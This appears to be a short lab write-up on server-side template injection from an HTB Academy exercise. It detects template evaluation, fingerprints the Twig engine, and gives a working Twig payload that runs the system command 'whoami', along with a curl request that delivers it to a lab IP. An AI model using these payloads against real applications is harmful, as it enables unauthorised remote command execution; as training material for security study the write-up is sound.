I tested some payload but only `{{7*7}}` and `{{7*'7'}}` worked.

![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/7ee66ad0-4a2f-4165-afaa-a77f00558222)

The application successfully evaluated this expression as well. According to PortSwigger's diagram, we are dealing with either a Jinja2 or a Twig template engine.

There are template engine-specific payloads that we can use to determine which of the two is being utilized. Let us try with the below Twig-specific one:
```bash
{{_self.env.display("TEST")}}
```
![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/c7d9620b-fb69-4b12-aa64-45dce1c7f7d1)

The Twig-specific payload was evaluated successfully. A Twig template engine is being utilized on the backend. 
For an extensive list of template engine-specific payloads, please refer to the following resources:

1) https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
2) https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

## Payload for command injection:
```bash
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
```
## Payload via curl:
```bash
curl -X POST -d 'name={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}' http://10.10.10.10:4444
```

